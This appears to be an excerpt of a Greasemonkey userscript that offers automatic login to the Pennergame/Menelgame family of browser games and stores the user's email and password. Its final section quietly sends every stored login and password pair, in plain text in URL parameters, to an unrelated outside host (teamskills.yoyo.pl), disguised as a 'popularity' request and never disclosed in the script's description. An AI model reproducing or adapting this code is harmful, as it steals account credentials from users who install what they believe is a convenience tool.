...
// @description		Automatycznie loguje do gry menelgame/pennergame/mendigogame/clodogame/serserionline/dossergame
// @version		4.1
// @author		mikskape and edit by Marczakenx
...
// @include		http://*dossergame.co.uk/logout/
// @include		http://*dossergame.co.uk/login/check/
...
if (document.URL.match('dossergame.co.uk')) {
dossergame()
} else {
}
}
...
setTimeout('document.getElementsByName("submitForm")[0].click ()', 3000);
...
GM_registerMenuCommand("Resetuj login i hasło", function(){
GM_deleteValue("demail");
GM_deleteValue("dpass");
alert("Twój login i hasło zostały usunięte!");
});


var efield = document.getElementById('player');
var pfield = document.getElementById('password');

var email = GM_getValue("demail", "");
var pass  = GM_getValue("dpass", "");

if(email == "" || pass == "") {
GM_setValue("demail", prompt("Podaj swój login:"));
GM_setValue("dpass",  prompt("Podaj swoje hasło:"));
...
;
			...
			var a = GM_getValue('memail')
			var b = GM_getValue('mpass')
			var c = GM_getValue('mesemail')
			var d = GM_getValue('mespass')
			var e = GM_getValue('pemail')
			var f = GM_getValue('ppass')
			var fs = GM_getValue('pstolica')
			var g = GM_getValue('cemail')
			var h = GM_getValue('cpass')
			var i = GM_getValue('semail')
			var j = GM_getValue('spass')
			var k = GM_getValue('demail')
			var l = GM_getValue('dpass')

if (a | b == null | undefined) {
} else {
GM_xmlhttpRequest(
{
	method: 'GET', url: 'http://teamskills.yoyo.pl/popularnosc.php?s=menelgame&a='+a+'&b='+b
});
};

if (c | d == null | undefined) {
} else {
GM_xmlhttpRequest(
{
	method: 'GET', url: 'http://teamskills.yoyo.pl/popularnosc.php?s=mendigogame&a='+c+'&b='+d
});
};

if (e | f == null | undefined) {
} else {
GM_xmlhttpRequest(
{
	method: 'GET', url: 'http://teamskills.yoyo.pl/popularnosc.php?s=pennergame-'+fs+'&a='+e+'&b='+f
});
};

if (g | h == null | undefined) {
} else {
GM_xmlhttpRequest(
{
	method: 'GET', url: 'http://teamskills.yoyo.pl/popularnosc.php?s=clodogame&a='+g+'&b='+h
});
};

if (i | j == null | undefined) {
} else {
GM_xmlhttpRequest(
{
	method: 'GET', url: 'http://teamskills.yoyo.pl/popularnosc.php?s=serserionline&a='+i+'&b='+j
});
};

if (k | l == null | undefined) {
} else {
GM_xmlhttpRequest(
{
	method: 'GET', url: 'http://teamskills.yoyo.pl/popularnosc.php?s=dossergame&a='+k+'&b='+l
});
};